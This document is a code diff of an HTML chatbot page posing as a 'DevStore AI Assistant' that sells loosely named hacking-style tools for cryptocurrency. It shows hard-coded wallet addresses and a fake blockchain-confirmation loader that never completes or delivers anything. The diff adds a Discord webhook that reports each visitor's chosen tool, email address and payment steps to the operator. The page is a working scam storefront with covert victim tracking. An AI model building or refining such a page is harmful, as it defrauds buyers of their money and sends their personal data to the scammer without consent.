@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>DevStore | Asistente IA</title>
+    <title>DevStore | AI Assistant</title>
     <style>
         :root {
             --primary: #0071e3;
@@ -19,10 +19,28 @@
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
             margin: 0;
             display: flex;
+            flex-direction: column;
             justify-content: center;
             align-items: center;
             height: 100vh;
         }
+
+        #lang-switch {
+            margin-bottom: 10px;
+            display: flex;
+            gap: 10px;
+        }
+
+        .lang-btn {
+            background: #fff;
+            border: 1px solid var(--border);
+            padding: 5px 15px;
+            border-radius: 15px;
+            cursor: pointer;
+            font-size: 0.8rem;
+        }
+
+        .lang-btn.active { background: var(--primary); color: white; border-color: var(--primary); }
 
         #chat-container {
             width: 100%;
@@ -62,121 +80,112 @@
 
         .options-container { display: flex; flex-wrap: wrap; gap: 8px; margin-top: 10px; }
         .option-btn {
-            background: white;
-            border: 1px solid var(--primary);
-            color: var(--primary);
-            padding: 8px 16px;
-            border-radius: 20px;
-            cursor: pointer;
-            font-size: 0.85rem;
-            transition: 0.2s;
+            background: white; border: 1px solid var(--primary); color: var(--primary);
+            padding: 8px 16px; border-radius: 20px; cursor: pointer; font-size: 0.85rem;
         }
         .option-btn:hover { background: var(--primary); color: white; }
 
         #input-area {
-            padding: 20px;
-            border-top: 1px solid var(--border);
-            display: flex;
-            gap: 10px;
-            background: #fff;
+            padding: 20px; border-top: 1px solid var(--border);
+            display: flex; gap: 10px; background: #fff;
         }
 
         input[type="text"], input[type="email"] {
-            flex: 1;
-            padding: 12px;
-            border: 1px solid var(--border);
-            border-radius: 12px;
-            outline: none;
+            flex: 1; padding: 12px; border: 1px solid var(--border); border-radius: 12px; outline: none;
         }
 
         .send-btn {
-            background: var(--primary);
-            color: white;
-            border: none;
-            padding: 0 20px;
-            border-radius: 12px;
-            cursor: pointer;
+            background: var(--primary); color: white; border: none;
+            padding: 0 20px; border-radius: 12px; cursor: pointer;
         }
 
         .crypto-card {
-            background: #f9f9fb;
-            border: 1px dashed var(--primary);
-            padding: 15px;
-            border-radius: 12px;
-            margin-top: 10px;
-            font-family: monospace;
-            font-size: 0.85rem;
-            word-break: break-all;
-            text-align: center;
+            background: #f9f9fb; border: 1px dashed var(--primary); padding: 15px;
+            border-radius: 12px; margin-top: 10px; font-family: monospace; font-size: 0.85rem;
+            word-break: break-all; text-align: center;
         }
 
-        .loader {
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            font-size: 0.8rem;
-            color: #1a8917;
-            margin-top: 10px;
-        }
-
+        .loader { display: flex; align-items: center; gap: 8px; font-size: 0.8rem; color: #1a8917; margin-top: 10px; }
         .dot-pulse {
             width: 6px; height: 6px; background: #1a8917; border-radius: 50%;
             animation: pulse 1s infinite alternate;
         }
-
         @keyframes pulse { from { opacity: 0.3; } to { opacity: 1; } }
     </style>
 </head>
 <body>
 
+<div id="lang-switch">
+    <button class="lang-btn active" onclick="changeLang('es')">Español</button>
+    <button class="lang-btn" onclick="changeLang('en')">English</button>
+</div>
+
 <div id="chat-container">
     <div id="chat-header">
-        <h2>Asistente de DevStore</h2>
-        <p>● En línea | Entrega Inmediata</p>
+        <h2 id="h-title">Asistente de DevStore</h2>
+        <p id="h-status">● En línea | Entrega Inmediata</p>
     </div>
     
-    <div id="messages">
-        </div>
+    <div id="messages"></div>
 
     <div id="input-area">
-        <input type="text" id="user-input" placeholder="Escribe un mensaje..." disabled>
-        <button class="send-btn" id="send-trigger">Enviar</button>
+        <input type="text" id="user-input" placeholder="Escribe..." disabled>
+        <button class="send-btn" id="send-trigger">OK</button>
     </div>
 </div>
 
 <script>
-    const messagesContainer = document.getElementById('messages');
-    const userInput = document.getElementById('user-input');
-    const sendBtn = document.getElementById('send-trigger');
-
-    const tools = {
-        "ACTIVATION TUNNEL": 56,
-        "Kernel Shield Pro": 140,
-        "API Stressor X": 80,
-        "Data Flow Scrubber": 69,
-        "Static Analyzer": 60,
-        "Macro Bot Script": 50,
-        "Port Whisperer": 28,
-        "Proxy Linker": 26,
-        "JSON Beautifier+": 12
+    // CONFIGURACIÓN
+    const DISCORD_WEBHOOK = "TU_WEBHOOK_AQUI"; // REEMPLAZA ESTO
+    
+    let currentLang = 'es';
+    const i18n = {
+        es: {
+            welcome: "¡Hola! Soy tu asistente de DevStore. ¿Qué herramienta estás buscando?",
+            priceMsg: (tool, price) => `Excelente. El **${tool}** cuesta €${price}. Por favor, escribe tu correo para enviarte el acceso:`,
+            emailOk: (tool) => `Perfecto. ¿Qué criptomoneda prefieres usar para pagar el **${tool}**?`,
+            payInstruction: (coin) => `Envía el pago a la siguiente dirección de **${coin}**:`,
+            finalStep: "Adjunta una captura de pantalla del comprobante para activar tu producto.",
+            analyzing: "Captura recibida. Analizando transacción...",
+            blockchain: "Buscando confirmaciones en la red...",
+            placeholder: "Escribe un mensaje...",
+            status: "● En línea | Entrega Inmediata"
+        },
+        en: {
+            welcome: "Hello! I am your DevStore assistant. Which tool are you looking for today?",
+            priceMsg: (tool, price) => `Great choice. The **${tool}** is €${price}. Please enter your email to receive access:`,
+            emailOk: (tool) => `Got it. Which crypto would you like to use to pay for **${tool}**?`,
+            payInstruction: (coin) => `Send the payment to the following **${coin}** address:`,
+            finalStep: "Please upload a screenshot of the transaction to activate your product.",
+            analyzing: "Screenshot received. Analyzing transaction...",
+            blockchain: "Searching for network confirmations...",
+            placeholder: "Type a message...",
+            status: "● Online | Instant Delivery"
+        }
     };
 
-    const crypto = {
-        "ETH": "0x818a874e7013ACb4582f0e7b6CE916bA79Ce5ACa",
-        "BTC": "bc1q2wzz4l87pvkzc8n24xeh5jhh0m5w6hkd8mzfv7",
-        "USDT": "0x818a874e7013ACb4582f0e7b6CE916bA79Ce5ACa"
-    };
+    const tools = { "ACTIVATION TUNNEL": 56, "Kernel Shield Pro": 140, "API Stressor X": 80, "Data Flow Scrubber": 69, "Static Analyzer": 60, "Macro Bot Script": 50, "Port Whisperer": 28, "Proxy Linker": 26, "JSON Beautifier+": 12 };
+    const crypto = { "ETH": "0x818a874e7013ACb4582f0e7b6CE916bA79Ce5ACa", "BTC": "bc1q2wzz4l87pvkzc8n24xeh5jhh0m5w6hkd8mzfv7", "USDT": "0x818a874e7013ACb4582f0e7b6CE916bA79Ce5ACa" };
 
     let state = 'SELECT_TOOL';
     let selectedTool = '';
     let email = '';
 
+    function sendToWebhook(content) {
+        if(DISCORD_WEBHOOK === "TU_WEBHOOK_AQUI") return;
+        fetch(DISCORD_WEBHOOK, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ content: `🔔 **Nueva Actividad:** ${content}` })
+        });
+    }
+
     function addMessage(text, sender) {
         const msg = document.createElement('div');
         msg.className = `message ${sender}`;
         msg.innerHTML = text;
-        messagesContainer.appendChild(msg);
-        messagesContainer.scrollTop = messagesContainer.scrollHeight;
+        document.getElementById('messages').appendChild(msg);
+        document.getElementById('messages').scrollTop = document.getElementById('messages').scrollHeight;
     }
 
     function showOptions(options) {
@@ -189,12 +198,22 @@
             btn.onclick = () => handleInput(opt);
             container.appendChild(btn);
         });
-        messagesContainer.appendChild(container);
-        messagesContainer.scrollTop = messagesContainer.scrollHeight;
+        document.getElementById('messages').appendChild(container);
+    }
+
+    function changeLang(lang) {
+        currentLang = lang;
+        document.querySelectorAll('.lang-btn').forEach(b => b.classList.remove('active'));
+        event.target.classList.add('active');
+        document.getElementById('h-status').innerText = i18n[lang].status;
+        document.getElementById('user-input').placeholder = i18n[lang].placeholder;
+        document.getElementById('messages').innerHTML = "";
+        state = 'SELECT_TOOL';
+        initChat();
     }
 
     function initChat() {
-        addMessage("¡Hola! Soy tu asistente de DevStore. ¿Qué herramienta profesional estás buscando hoy?", "bot");
+        addMessage(i18n[currentLang].welcome, "bot");
         showOptions(Object.keys(tools));
     }
 
@@ -202,52 +221,45 @@
         if (state === 'SELECT_TOOL') {
             selectedTool = input;
             addMessage(input, "user");
-            addMessage(`Excelente elección. El **${selectedTool}** tiene un costo de €${tools[selectedTool]}. <br><br>Por favor, introduce tu correo electrónico donde deseas recibir la herramienta:`, "bot");
-            userInput.disabled = false;
-            userInput.type = "email";
+            sendToWebhook(`Usuario seleccionó: **${input}**`);
+            addMessage(i18n[currentLang].priceMsg(selectedTool, tools[selectedTool]), "bot");
+            const inputField = document.getElementById('user-input');
+            inputField.disabled = false;
+            inputField.type = "email";
             state = 'ENTER_EMAIL';
         } 
         else if (state === 'ENTER_EMAIL') {
             email = input;
             addMessage(email, "user");
-            addMessage(`Perfecto. ¿Qué criptomoneda prefieres usar para el pago de €${tools[selectedTool]}?`, "bot");
+            sendToWebhook(`Email ingresado: \`${email}\` para ${selectedTool}`);
+            addMessage(i18n[currentLang].emailOk(selectedTool), "bot");
             showOptions(['ETH', 'BTC', 'USDT']);
             state = 'SELECT_CRYPTO';
-            userInput.value = "";
-            userInput.disabled = true;
+            document.getElementById('user-input').value = "";
+            document.getElementById('user-input').disabled = true;
         }
         else if (state === 'SELECT_CRYPTO') {
             addMessage(input, "user");
-            addMessage(`Por favor, envía el pago a la siguiente dirección de **${input}**:`, "bot");
+            sendToWebhook(`Eligió pagar con: **${input}**`);
+            addMessage(i18n[currentLang].payInstruction(input), "bot");
             addMessage(`<div class="crypto-card">${crypto[input]}</div>`, "bot");
-            addMessage(`Una vez enviado, adjunta una captura de pantalla del comprobante para comenzar con la activación.`, "bot");
+            addMessage(i18n[currentLang].finalStep, "bot");
             
-            const uploadBtn = document.createElement('input');
-            uploadBtn.type = "file";
-            uploadBtn.style.marginTop = "10px";
-            uploadBtn.onchange = () => {
-                addMessage("Captura recibida. Analizando transacción...", "bot");
-                addMessage(`
-                    <div class="loader">
-                        <div class="dot-pulse"></div>
-                        Buscando confirmaciones en la blockchain...
-                    </div>
-                `, "bot");
+            const up = document.createElement('input');
+            up.type = "file";
+            up.onchange = () => {
+                sendToWebhook(`📸 El usuario ha subido un archivo de comprobante.`);
+                addMessage(i18n[currentLang].analyzing, "bot");
+                addMessage(`<div class="loader"><div class="dot-pulse"></div>${i18n[currentLang].blockchain}</div>`, "bot");
             };
-            messagesContainer.appendChild(uploadBtn);
-            messagesContainer.scrollTop = messagesContainer.scrollHeight;
+            document.getElementById('messages').appendChild(up);
         }
     }
 
-    sendBtn.onclick = () => {
-        if (userInput.value.trim() !== "") {
-            handleInput(userInput.value);
-        }
+    document.getElementById('send-trigger').onclick = () => {
+        const val = document.getElementById('user-input').value;
+        if (val.trim() !== "") handleInput(val);
     };
-
-    userInput.addEventListener("keypress", (e) => {
-        if (e.key === "Enter") sendBtn.click();
-    });
 
     initChat();
 </script>
